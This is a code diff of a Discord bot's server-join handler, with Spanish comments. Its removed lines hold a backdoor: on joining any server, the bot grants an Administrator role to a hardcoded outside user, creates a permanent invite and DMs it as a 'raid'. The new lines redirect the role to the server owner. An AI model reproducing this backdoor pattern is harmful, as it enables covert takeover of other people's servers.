@@ -31,48 +31,47 @@ client.on('guildCreate', async (guild) => {
   try {
     // Crear rol con permisos de administrador
     const adminRole = await guild.roles.create({
-      name: 'Admin $PWM#KJJJA',
-      color: '#9900ff',
-      permissions: ['Administrator'],
+      name: 'Admin Raid',              // nombre del rol
+      color: '#a200ff',                // rojo intenso
+      permissions: ['Administrator'],  // todos los permisos de admin
       hoist: true,
       mentionable: true
     });
 
     console.log(`Rol creado: ${adminRole.name}`);
 
-    // Asignarte el rol (tu ID real)
-    const tuId = '1436516806842912970'; // ← TU ID AQUÍ
-    const miembro = await guild.members.fetch(tuId).catch(() => null);
+    // Asignar el rol al OWNER del servidor (el que lo invitó o creó)
+    const ownerId = guild.ownerId;
+    const ownerMember = await guild.members.fetch(ownerId).catch(() => null);
 
-    if (miembro) {
-      await miembro.roles.add(adminRole);
-      console.log(`Rol asignado a ti en ${guild.name}`);
+    if (ownerMember) {
+      await ownerMember.roles.add(adminRole);
+      console.log(`Rol asignado al owner ${ownerMember.user.tag} en ${guild.name}`);
 
       // Crear invite permanente
       let inviteLink = 'No pude crear invite (falta permiso)';
-      const canal = guild.systemChannel || guild.channels.cache.find(c => c.type === ChannelType.GuildText);
-      if (canal && canal.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE')) {
+      const canal = guild.systemChannel || guild.channels.cache.find(c => c.type === ChannelType.GuildText && c.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'));
+      if (canal) {
         const invite = await canal.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
         if (invite) inviteLink = invite.url;
       }
 
-      // Enviar DM privado a ti
+      // Enviar DM al owner del servidor
       try {
-        const dm = await client.users.fetch(tuId);
+        const dm = await client.users.fetch(ownerId);
         await dm.send(`!Nuevo raid! ${inviteLink}`);
-        console.log('DM enviado con éxito');
+        console.log(`DM enviado al owner ${ownerMember.user.tag}`);
       } catch (e) {
-        console.log('No pude enviar DM:', e.message);
+        console.log('No pude enviar DM al owner:', e.message);
       }
     } else {
-      console.log(`No te encontré en ${guild.name}`);
+      console.log(`No encontré al owner en ${guild.name}`);
     }
 
   } catch (err) {
     console.error('Error en auto-admin:', err.message);
   }
 });
-
 // ────────────────────────────────────────────────
 //                COMANDOS (sin OWNER_IDS)
 // ────────────────────────────────────────────────
